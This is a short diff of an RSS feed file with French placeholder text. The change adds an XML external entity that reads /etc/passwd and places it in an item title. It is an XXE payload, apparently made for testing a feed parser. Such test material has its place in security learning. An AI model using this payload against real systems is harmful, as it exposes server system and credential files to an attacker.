@@ -1,11 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
 <rss version="2.0">
   <channel>
-    <title>Nom du site</title>
-    <link>http://monsite.com</link>
-    <description>Ma description</description>
+    <title>Mon Test</title>
     <item>
-       <title>Titre de l'article</title>
-       <description>Ici, on met le texte... ou ton payload XXE !</description>
+      <title>&xxe;</title>
+      <description>Test de lecture</description>
     </item>
   </channel>
 </rss>
